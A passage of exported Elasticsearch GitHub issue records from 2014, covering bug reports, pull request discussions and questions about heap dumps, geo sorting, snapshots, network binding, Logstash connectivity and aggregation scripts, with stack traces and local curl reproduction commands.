</description><key id="41155926">7452</key><summary>test: write heap dump to log folder</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels /><created>2014-08-26T10:08:33Z</created><updated>2014-08-28T12:55:31Z</updated><resolved>2014-08-28T12:55:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-26T13:57:12Z" id="53423629">I am not sure if this will work if the security manager is enabled since the JVM is not allowed to write there... did you try that out? I also wonder if the CI servers should just set this variable and point to a valid directory /cc @mrsolo 
</comment><comment author="brwe" created="2014-08-27T18:22:53Z" id="53617777">Ok, added a parameter `tests.heap.dumplocation`
Should it point to ${basedir}/logs or just default if not set?

@s1monw by "security manager is enabled" did you mean -Dtests.security.manager=true ? If so, that does not seem to prevent writing anywhere
</comment><comment author="mrsolo" created="2014-08-27T18:37:59Z" id="53620042">It doesn't matter to Jenkins that much on the existing of the default.  However having a working default set will avoid..'ooops forgot to turn on the heap dump' scenario when running tests outside of the Jenkins..

Hmm doesn't dev-tools/tests.policy restricted accesses? 
</comment><comment author="s1monw" created="2014-08-28T06:59:30Z" id="53680396">I think the patch looks good. Can we maybe make the setting consistent to the JVM setting ie. `test.heapdump.path`?
</comment><comment author="brwe" created="2014-08-28T07:56:10Z" id="53684606">That would be `tests.heapdump.path` with an `s` right?
</comment><comment author="brwe" created="2014-08-28T11:59:06Z" id="53710116">Ok, renamed. I do not know why the heap dump is always written even with security manager enabled. Any pointers appreciated.
</comment><comment author="brwe" created="2014-08-28T12:29:20Z" id="53712792">After brief discussion with @s1monw : heap dump is written by jvm and not by the application itself. This is why security manager does not check.
</comment><comment author="s1monw" created="2014-08-28T12:30:26Z" id="53712906">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>document field parsing: refactor to remove external value mechanism</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7451</link><project id="" key="" /><description>I just make this pull request for having a better basis to discuss potential changes in the way external values are handled right now. I do not think it is ready for pulling in yet. Feel free to comment.

The external value mechanism was a workaround for not being able to set
a value while parsing a field value. It was used for example by geo point
to set the values for the lat and lon field. However, its the major
disadvantage was that it made the code hard to read.
This commit removes the external value from parse context and instead
adds a new method FieldMapper.addValue() which can be used to add fields
to a mapper that are unrelated to the currently parsed source.
In addition, this method is now used also by the multi_field handling so that
parsing is called only once and the parsed value (or any other) is passed
to multi_fields explicitely. Before, multi_fields relied on the parser
being at a particular position.
This means that now values which are objects or arrays in a json structure
can also be passed to multi_fields which was not possible before
(see BaseTypeMapperTests where all test except for testMultiFieldsWithArray
failed without this change).
</description><key id="41144136">7451</key><summary>document field parsing: refactor to remove external value mechanism</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">brwe</reporter><labels /><created>2014-08-26T07:24:53Z</created><updated>2015-02-25T08:53:17Z</updated><resolved>2015-02-20T11:50:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-02T09:35:51Z" id="54128624">I only skimmed through the diff but I like the idea! Why do you say it is not ready for pulling in yet, are there unsolved issues?
</comment><comment author="brwe" created="2014-09-04T16:42:42Z" id="54507393">I now replaced the parseCreateField and innerParseCreateField by parseField and createField. Seems easier to read for me and makes more sense also.

My major concern is that some untested functionallity might have changed. But then again it removes lots of untested code and fixes some bugs so maybe not so bad after all.
</comment><comment author="clintongormley" created="2014-11-11T19:50:49Z" id="62608769">@jpountz please could you take a look at this one
</comment><comment author="javanna" created="2015-02-25T08:52:04Z" id="75925434">this was not merged after all, right @brwe ?
</comment><comment author="brwe" created="2015-02-25T08:53:11Z" id="75925583">@javanna no. It is so old and many things changed in the meanwhile, don't think it is worth spending more time on it. I'll remove the labels.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Exception when empty result returned with a geo sort</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7450</link><project id="" key="" /><description>i'm using 1.1 version of elastic search, and it result an exception if the result is empty.
the index has the location field, with correct geo_point type 

i don't have a precise view of the source structure, but it seems the mapper is not found.

any help is welcome.

cheers, 
Patrice

Query sent :

```
{
  "size": 5,
  "query": {
    "bool": {
      "should": {
        "query_string": {
          "query": "complet3:(rtpjijier*)"
        }
      }
    }
  },
  "fields": [
    "gcd_num",
    "gcd_nomrue",
    "gcd_cp",
    "depadmin",
    "locality",
    "locname",
    "postcode",
    "gcd_ville",
    "complet"
  ],
  "sort": [
    {
      "_geo_distance": {
        "location": [
          4.899999999999901,
          45.69989402483941
        ],
        "unit": "km"
      }
    }
  ]
}
```

Throws this exception:

```
    [2014-08-26 08:44:43,175][DEBUG][action.search.type       ] [El Muerto] [keyword][1], node[lGfj6zEdTy-9f8ZClTkI9Q], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@1564f3fe] lastShard [true]
    org.elasticsearch.search.SearchParseException: [keyword][1]: query[complet3:rtpjijier*],from[-1],size[5]: Parse Failure [Failed to parse source [{"size":5,"query":{"bool":{"should":{"query_string":{"query":"complet3:(rtpjijier*)"}}}},"fields":["gcd_num","gcd_nomrue","gcd_cp","depadmin","locality","locname","postcode","gcd_ville","complet"],"sort":[{"_geo_distance":{"location":[4.899999999999901,45.69989402483941],"unit":"km"}}]}]]
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:634)
        at org.elasticsearch.search.SearchService.createContext(SearchService.java:507)
        at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:480)
        at org.elasticsearch.search.SearchService.executeDfsPhase(SearchService.java:186)
        at org.elasticsearch.search.action.SearchServiceTransportAction.sendExecuteDfs(SearchServiceTransportAction.java:168)
        at org.elasticsearch.action.search.type.TransportSearchDfsQueryThenFetchAction$AsyncAction.sendExecuteFirstPhase(TransportSearchDfsQueryThenFetchAction.java:85)
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction.performFirstPhase(TransportSearchTypeAction.java:216)
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction.performFirstPhase(TransportSearchTypeAction.java:203)
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction$2.run(TransportSearchTypeAction.java:186)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:724)
    Caused by: org.elasticsearch.ElasticsearchIllegalArgumentException: failed to find mapper for [location] for geo distance based sort
        at org.elasticsearch.search.sort.GeoDistanceSortParser.parse(GeoDistanceSortParser.java:120)
        at org.elasticsearch.search.sort.SortParseElement.addCompoundSortField(SortParseElement.java:138)
        at org.elasticsearch.search.sort.SortParseElement.parse(SortParseElement.java:80)
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:622)
        ... 11 more
```
</description><key id="41142508">7450</key><summary>Exception when empty result returned with a geo sort</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">frett27</reporter><labels><label>:Geo</label><label>adoptme</label><label>bug</label></labels><created>2014-08-26T06:54:58Z</created><updated>2014-11-29T13:42:34Z</updated><resolved>2014-11-29T13:42:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-26T08:49:24Z" id="53391988">Related to #5532
</comment><comment author="clintongormley" created="2014-11-29T13:42:34Z" id="64952214">I'm unable to replicate this bug.  Things seem to work as expected (as long as the `location` field exists in the same index):

```
DELETE /t 

PUT /t
{
  "mappings": {
    "t": {
      "properties": {
        "location": {
          "type": "geo_point"
        }
      }
    }
  }
}

PUT /t/t/1
{
  "bar": "one",
  "location": "0,0"
}

PUT /t/t/2
{
  "bar": "two"
}
```

Try changing `bar` to `one` | `two` | `three`:

```
GET _search
{
  "query": {
    "match": {
      "bar": "one"
    }
  },
  "sort": [
    {
      "_geo_distance": {
        "location": {
          "lat": 40,
          "lon": -70
        },
        "order": "asc"
      }
    }
  ]
}
```

I think the original cause of your exception probably came from either:
1. searching across indices, where one index didn't include the `location` field (#5532)
2. having two fields called `location`, one of which was not a geo-point (#4081)

Closing in favour of the already open issues above.  If you have more detail that points to a different bug, please feel free to reopen.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>How to get the count of matched search term in all the fields in each resulting document</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7449</link><project id="" key="" /><description>We have a web application, where we are providing a global search feature through Elasticsearch. One can use this feature to search any text across all the documents (and on all fields). We are using '_all' in fields while querying elastic search. This yields us the desired results perfectly. Below is the sense example.
{
   "query": {
        "query_string": {
            "query": anysearchterm,
            "fields": [ "_all" ]
        }
   }
}

Now what we want next is the precise relevance of the search result. We want to know, in which all fields, within each of the resulting document, did elastic search found the match for the search term. Thus we want to know the occurrence of the search term, with respect to individual fields, for all the resulting documents.

We have been searching for this for quiet some time. We have tried 'explain' option while querying, but this does not give field specific count of the search term. 

Any kind of help is highly appreciated. We would be really greatfull if anybody can put some insights on this.

Thank you.
</description><key id="41138768">7449</key><summary>How to get the count of matched search term in all the fields in each resulting document</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">manojacharya</reporter><labels /><created>2014-08-26T05:38:02Z</created><updated>2014-08-26T08:38:30Z</updated><resolved>2014-08-26T08:38:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-26T08:38:30Z" id="53390935">Hi @manojacharya 

This issues list is for bug reports and feature requests.  Please ask questions like this on the user forum instead.  As a hint, look either at using named filters or highlighting, but there is no easy way to get exactly what you want here
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>After snapshot done Got ElasticsearchParseException. Ref - 7427</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7448</link><project id="" key="" /><description>Continue from ....

https://github.com/elasticsearch/elasticsearch/issues/7427

All shards has been done.

Though I couldn't able to see status of all shards done successfully. I could see 9 shards done and when i refresh to check 10th shard status it has given following exception. (But that river index was not selected during snapshot.)

{
"error" : "ElasticsearchParseException[failed to parse river [other river name], incompatible params]",
"status" : 400
}

Mean while i have confirmed shards sizes on disk is equal to shard size showing in head plugin. Should i consider it has been done successfully?
</description><key id="41135965">7448</key><summary>After snapshot done Got ElasticsearchParseException. Ref - 7427</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">appasahebs</reporter><labels><label>feedback_needed</label></labels><created>2014-08-26T04:16:26Z</created><updated>2014-11-14T18:22:56Z</updated><resolved>2014-11-14T18:22:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="appasahebs" created="2014-08-26T04:16:59Z" id="53373658">Checked all nodes logs and nothing was there.
</comment><comment author="imotov" created="2014-08-27T18:04:01Z" id="53614844">@appasahebs I am confused. Did you edit the error message? What do you refresh to check 10th shard? Which command are you running?
</comment><comment author="appasahebs" created="2014-08-28T04:31:01Z" id="53672584">I was checking snapshot status api on browser. i.e. _snapshot/snapshot/snapshot_22_aug-2014/_status
</comment><comment author="appasahebs" created="2014-09-01T15:33:13Z" id="54072419">So finally i can able to do snapshot of my index and its successfully worked. But during restore after some time elasticsearch is stopping and log is showing as following ... 

[2014-09-01 06:45:34,481][INFO ][node                     ] [RestoreNodeTest] stopping ...
[2014-09-01 06:45:35,119][INFO ][node                     ] [RestoreNodeTest] stopped
[2014-09-01 06:45:35,119][INFO ][node                     ] [RestoreNodeTest] closing ...
[2014-09-01 06:45:55,130][INFO ][node                     ] [RestoreNodeTest] closed
</comment><comment author="imotov" created="2014-09-02T15:56:36Z" id="54173832">@appasahebs which version of elasticsearch are you using? I searched elasticsearch code (v1.3.0) and we have no exceptions with the text "failed to parse river". We also don't shutdown nodes during restore. 
</comment><comment author="appasahebs" created="2014-09-02T15:59:50Z" id="54174345">yeah i am using same i.e. 1.3.0. 

Meanwhile, after tying couple of times i can able to do snapshot but restored was not completed. During snapshot elasticsearch stopped working and its close automatically.

Log was showing ....

[2014-09-01 06:45:34,481][INFO ][node ] [RestoreNodeTest] stopping ...
[2014-09-01 06:45:35,119][INFO ][node ] [RestoreNodeTest] stopped
[2014-09-01 06:45:35,119][INFO ][node ] [RestoreNodeTest] closing ...
[2014-09-01 06:45:55,130][INFO ][node ] [RestoreNodeTest] closed
</comment><comment author="clintongormley" created="2014-09-06T15:22:10Z" id="54715198">@appasahebs where is that "failed to parse river" message coming from? Is that in your code?

It looks like you are trying to write a test for snapshot/restore, but you are shutting down the node while the restore is still running.   Please can you paste your code in here so that we can see what you are doing.
</comment><comment author="clintongormley" created="2014-11-14T18:22:56Z" id="63106968">No more feedback. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>nonlocal binding</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7447</link><project id="" key="" /><description>Currently when setting the transport host to an interface that doesn't yet exist (using Linux's `ip_nonlocal_bind`, eg), ES will start fine, but then complain often about not being able to make connections internally to itself:

```
2014-08-25 23:26:28.802763500 [2014-08-25 23:26:28,799][WARN ][cluster.service          ] [foo] failed to reconnect to node [foo][eEex7V1LRGOV6SNBw-UZmg][monitor][inet[/192.168.56.200:9300]]
2014-08-25 23:26:28.802764500 org.elasticsearch.transport.ConnectTransportException: [foo][inet[/192.168.56.200:9300]] connect_timeout[30s]
2014-08-25 23:26:28.802766500   at org.elasticsearch.transport.netty.NettyTransport.connectToChannels(NettyTransport.java:677)
2014-08-25 23:26:28.803108500   at org.elasticsearch.transport.netty.NettyTransport.connectToNode(NettyTransport.java:611)&#160;
```

Clearly, the transport not having a working interface that it _expects_ to be working is exceptional and should be reported as such.  I'm wondering how we can support when you don't expect it.  I thought about a `network.allow_nonlocal_bind` or somesuch flag.  Or maybe added syntax to the interface definition, like `~_eth0_`.  Thoughts?
</description><key id="41122732">7447</key><summary>nonlocal binding</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">drewr</reporter><labels><label>:Network</label><label>enhancement</label><label>feedback_needed</label></labels><created>2014-08-25T23:55:39Z</created><updated>2016-11-25T18:36:07Z</updated><resolved>2016-11-25T18:36:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="grantr" created="2014-08-26T01:40:34Z" id="53363385">In my testing, the startup process is initially blocked for 30 seconds by the connect timeout. This is more onerous than the log messages.
</comment><comment author="clintongormley" created="2014-11-07T10:12:46Z" id="62122769">@drewr Can you explain when you would use `ip_nonlocal_bind` in practice?
</comment><comment author="drewr" created="2015-05-29T16:16:55Z" id="106861607">The larger vision here is that ES can transparently handle situation where a network interface may not be available. This could happen, for example, with VPN where a virtual interface may not be created yet when starting up.
</comment><comment author="clintongormley" created="2015-11-21T17:34:54Z" id="158663854">@drewr ok - I still don't understand, you're going to need to spell it out for me :)

What do you expect ES to do if the network interface isn't available?
</comment><comment author="clintongormley" created="2016-11-25T18:36:07Z" id="263009199">Nothing further. Closing</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Function Score: Refactor RandomScoreFunction to be consistent, and return values in range [0.0, 1.0]</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7446</link><project id="" key="" /><description>RandomScoreFunction previously relied on the order the documents were
iterated in from Lucene. This caused changes in ordering, with the same
seed, if documents moved to different segments. With this change, a
murmur32 hash of the _uid for each document is used as the "random"
value. Also, the hash is adjusted so as to only return values between
0.0 and 1.0 to enable easier manipulation to fit into users' scoring
models.

closes #6907
</description><key id="41120551">7446</key><summary>Function Score: Refactor RandomScoreFunction to be consistent, and return values in range [0.0, 1.0]</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Query DSL</label><label>breaking</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-25T23:27:34Z</created><updated>2015-06-06T16:25:48Z</updated><resolved>2014-08-27T15:58:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-25T23:48:31Z" id="53353581">Sorry about that @jpountz  I have removed those extraneous changes.
</comment><comment author="jpountz" created="2014-08-26T08:15:42Z" id="53388764">The diff looks good to me but I'm wondering that we should enable doc values by default on `_uid` before merging such a change?
</comment><comment author="rjernst" created="2014-08-26T14:54:49Z" id="53433493">@jpountz That's the assumption that I was waiting on this fix for all this time.  However, this still brings improvements that I believe are important to get into master (2 bug fixes and an simplification of return values).  The caveat of course is the cost of pulling `_uid` into field data, but I think that is just something to be improved upon in the future, rather than continuing with the current broken behavior.
</comment><comment author="jpountz" created="2014-08-26T16:58:42Z" id="53453269">Then let's add some documentation to make clear that this feature relies on fielddata of the `_uid` field?
</comment><comment author="rjernst" created="2014-08-27T03:16:01Z" id="53522315">@jpountz I modified the docs for random_score a little to mention `uid`.  Let me know if that is what you had in mind, or if you wanted something more.
</comment><comment author="jpountz" created="2014-08-27T11:37:27Z" id="53557456">This is what I had in mind. Maybe also put a warning that it will load field data for the `_uid` field (which can be very memory-intensive given that all values are unique). Otherwise LGTM (feel free to push without asking for further review from my end).
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Logstash (node client) haphazardly connects to Elasticsearch</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7445</link><project id="" key="" /><description>## Logstash (node client) haphazardly connects to Elasticsearch
### Cross-posted:
- https://github.com/elasticsearch/elasticsearch/issues/7445
- https://logstash.jira.com/browse/LOGSTASH-2283
### Summary
- Logstash (node client) haphazardly connects to Elasticsearch.
- Since it sometimes connects, it rules out any obvious issues with
  - Logstash configuration
  - Elasticsearch configuration
  - Network configuration
- We have 2 Elasticsearch outputs on 1 Logstash instance
  - The first output in the conf file will connect, the second will get a `MasterNotDiscoveredException`.
  - If we reverse the order of the outputs (2nd becomes 1st), then what was previously 2nd now connects.
  - Sometimes both connect.
- I believe this is an Elasticsearch issue (and not Logstash) because
  - Logstash uses Node Client which finally uses the jars provided by Elasticsearch.
  - The connection request from Logstash arrives at the Elasticsearch master.
### Setup
- Elasticsearch (1.0.1) with Logstash (1.4.0) (These versions allow node client).
- Elasticsearch and Logstash are in different lans, however tcpdump reveals that they are receiving each others' traffic.
- We are using unicast. Logstash is not in the `discovery.zen.ping.unicast.hosts` list. The rest of the cluster is.
- Elasticsearch cluster has 7 nodes with 3 dedicated masters that are not doing anything except being masters.
- The cluster has about 600 shards (60 indices).
### Details
- There are no errors in the log files when run at trace level.
- Most of the lines look like:

```
[2014-08-25 16:46:53,142][TRACE][cluster                  ] [es_master1] Submitting new rescheduling cluster info update job
[2014-08-25 16:46:53,142][TRACE][cluster                  ] [es_master1] Performing ClusterInfoUpdateJob
[2014-08-25 16:46:53,142][TRACE][cluster                  ] [es_master1] Scheduling next run for updating cluster info in: 30s
[2014-08-25 16:46:53,142][TRACE][cluster                  ] [es_master1] Skipping ClusterInfoUpdatedJob since it is disabled
[2014-08-25 16:46:54,288][TRACE][transport.netty          ] [es_master1] channel closed: [id: 0x72c1a352, /10.22.65.83:59057 =&gt; /10.22.165.105:9300]
[2014-08-25 16:46:54,340][TRACE][transport.netty          ] [es_master1] channel opened: [id: 0xbc141af9, /10.22.65.83:59072 =&gt; /10.22.165.105:9300]
```
- On the Logstash side, there are a lot of tcp resets. However, I believe that's because Logstash tries port 9300-9305, and Elasticsearch closes the ones it does not intend to use.

```
16:47:40.233712 IP logstash1.59310 &gt; es_master_1.vrace: Flags [.], ack 1153, win 4, length 0
16:47:40.234470 IP logstash1.35367 &gt; es_master_1.9301: Flags [S], seq 923830868, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 14], length 0
16:47:40.235067 IP es_master_1.9301 &gt; logstash1.35367: Flags [R.], seq 2246437439, ack 923830869, win 0, length 0
16:47:40.240005 IP logstash1.54146 &gt; es_master_1.9303: Flags [S], seq 3764962801, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 14], length 0
16:47:40.240539 IP es_master_1.9303 &gt; logstash1.54146: Flags [R.], seq 2168257573, ack 3764962802, win 0, length 0
16:47:40.240748 IP logstash1.54507 &gt; es_master_1.9305: Flags [S], seq 244766238, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 14], length 0
16:47:40.241278 IP es_master_1.9305 &gt; logstash1.54507: Flags [R.], seq 1372279245, ack 244766239, win 0, length 0
16:47:40.241761 IP logstash1.35916 &gt; es_master_1.9302: Flags [S], seq 4110405003, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 14], length 0
16:47:40.242295 IP es_master_1.9302 &gt; logstash1.35916: Flags [R.], seq 2701921297, ack 4110405004, win 0, length 0
16:47:40.243685 IP logstash1.38021 &gt; es_master_1.9304: Flags [S], seq 3891794882, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 14], length 0
16:47:40.244448 IP es_master_1.9304 &gt; logstash1.38021: Flags [R.], seq 2041403893, ack 3891794883, win 0, length 0
```
### What I've tried
- Thinking it could be a timeout somewhere, I've tried increasing these in Logstash (to no avail).
  - `discovery.zen.ping_timeout`
  - `discovery.zen.join_timeout`
  - `discovery.zen.ping.fd.ping_timeout`
  - `discovery.zen.ping.fd.ping_retries`
- I tried changing this in Elasticsearch master
  - `discovery.zen.publish_timeout: 1`
- Not everything is available from the config so for some of them, I had to patch Logstash.
# Clues?
- When Elasticsearch and Logstash are in the same LAN, this does not happen.
  - This would seem to indicate a network issue ... but what? ... especially since they do connect sometimes.
  - The traceroute from Logstash to Elasticsearch looks like:

```
traceroute to es_master_1 (XX.XX.XXX.105), 30 hops max, 60 byte packets
 1  XX.XX.XX.2 (XX.XX.XX.2)  1.103 ms  1.197 ms  1.300 ms
 2  XXX.XX.XX.169 (XXX.XX.XX.169)  0.187 ms  0.233 ms  0.220 ms
 3  XXX.XX.XX.162 (XXX.XX.XX.162)  1.447 ms  1.474 ms  1.571 ms
 4  XXX.XXX.XX.33 (XXX.XXX.XX.33)  1.402 ms  1.524 ms  1.588 ms
 5  XXX.XXX.XX.26 (XXX.XXX.XX.26)  1.940 ms  1.979 ms  2.076 ms
 6  XXX.XX.XX.190 (XXX.XX.XX.190)  0.520 ms  0.488 ms  0.463 ms
 7  XXX.XX.XX.197 (XXX.XX.XX.197)  2.082 ms  1.739 ms  1.859 ms
 8  es_master_1 (XX.XX.XXX.105)  0.522 ms  0.458 ms  0.497 ms
```
</description><key id="41117347">7445</key><summary>Logstash (node client) haphazardly connects to Elasticsearch</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">gseng</reporter><labels><label>feedback_needed</label></labels><created>2014-08-25T22:42:18Z</created><updated>2015-04-19T20:23:33Z</updated><resolved>2015-04-19T20:23:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="gseng" created="2014-09-11T13:37:10Z" id="55264356">My workaround was to have only 1 elasticsearch output per logstash.
</comment><comment author="clintongormley" created="2014-11-07T10:08:23Z" id="62122328">Hi @gseng 

Would you be able to patch the node client on the logstash side to enable trace logging for discovery?  That would be very helpful.  Also, the tcpdump output indicates that it is trying ports 9301-9305 but not 9300.  Is this something you've configured?
</comment><comment author="gseng" created="2014-11-08T15:33:57Z" id="62261834">Hi @clintongormley , 

The  setting of the ports is done by logstash as a default:
- http://logstash.net/docs/1.4.0/outputs/elasticsearch#port
- https://github.com/elasticsearch/logstash/blob/1.4/lib/logstash/outputs/elasticsearch/protocol.rb

I will see if I have time next week to set the trace logging for discovery. The tricky part is of course the haphazard nature ... so hopefully I'll be able to capture something.
</comment><comment author="clintongormley" created="2015-04-05T20:19:18Z" id="89846699">Hi @gseng 

Have you resolved this issue, or have anything further to report?
</comment><comment author="gseng" created="2015-04-19T20:23:31Z" id="94310457">I think that this can be closed since we worked around it by having only 1 elasticsearch output per logstash. If others have not found an issue, it could be something with our environment.

In any case, we're going down the road of using logstash with elasticsearch http after some advice from @bleskes at Elasticon.

The only thing to report is if others are interested in setting timeouts, logstash now supports it with "Pass in es.\* java properties (java -Des.node.foo= or ruby -J-Des.node.foo=)" [logstash - elasticsearch output](http://logstash.net/docs/1.4.2/outputs/elasticsearch)

Thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Inconsitent behavior when using field + scripts simultaneously.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7444</link><project id="" key="" /><description>Documentation states that when field and script settings are both present in an agg, then the script should only be able to work on the _value and should not be able to access anything at the doc[] level. However, this behavior is not consistent. Below is a script with comments to reproduce the inconsistency.

We should likely add a validation check wherein if you use field + script together, and your script contains a doc[] expression, that should fail with a clear error that it is not allowed.

Repro case:

```
curl -XDELETE localhost:9200/foo

curl -XPUT localhost:9200/foo -d '
{
  "settings": {
    "index.number_of_shards": 1,
    "index.number_of_replicas": 0
  }
}'

curl -XPOST localhost:9200/foo/doc/1 -d '{
  "s": 1
}'

curl -XPOST localhost:9200/foo/doc/2 -d '{
  "s": 2
}'

curl -XPOST localhost:9200/foo/doc/3 -d '{
  "s": 3
}'

curl -XPOST localhost:9200/foo/_refresh

#fails as expected in ES 1.2.3
#succeeds in ES 1.3.2
curl -XPOST "localhost:9200/foo/_search" -d '
{
  "aggs": {
    "2": {
      "sum": {
        "field": "s",
        "script": "doc[\"s\"].value"
      }
    }
  }
}'

#succeeds unexpectedly in ES 1.2.3
#succeeds in ES 1.3.2
curl "localhost:9200/foo/_search?search_type=count&amp;pretty" -d '
{
  "aggs": {
    "1": {
      "sum": {
        "script": "doc[\"s\"].value"
      }
    },
    "2": {
      "sum": {
        "field": "s",
        "script": "doc[\"s\"].value"
      }
    }
  }
}'
```
</description><key id="41115867">7444</key><summary>Aggregations: Inconsitent behavior when using field + scripts simultaneously.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">bly2k</reporter><labels /><created>2014-08-25T22:28:16Z</created><updated>2014-08-26T13:19:44Z</updated><resolved>2014-08-26T13:19:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-26T08:30:25Z" id="53390155">@bly2k i don't think that we should prevent access to other fields when a `field` is specified.  What if you want to compare the current `_value` with the value of another field in the doc?

The difference is that when you specify a `field`, the `script` gets called once for every value that field contains, but without a field, it just gets called once.  This is by design.

Where do the docs say that a value script should **only** be able to work on the `_value`? If they do say that, then the docs should be changed.
</comment><comment author="bly2k" created="2014-08-26T10:51:56Z" id="53403492">@clintongormley Maybe you're right I'm just reading the docs incorrectly:

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations.html#_values_source

"When both field and script settings are configured for the aggregation, the script will be treated as a value script. While normal scripts are evaluated on a document level (i.e. the script has access to all the data associated with the document), value scripts are evaluated on the value level. In this mode, the values are extracted from the configured field and the script is used to apply a "transformation" over these value/s."

Regardless, something needs to be corrected, either doc, or code (since the code produces inconsistent results). :)
</comment><comment author="clintongormley" created="2014-08-26T11:00:14Z" id="53404190">Why do you say the code produces inconsistent results? If I run this in master, both of them give me a sum of 6, which is what I'd expect.
</comment><comment author="clintongormley" created="2014-08-26T11:01:22Z" id="53404268">And those docs seem consistent with the behaviour (and the intended behaviour)
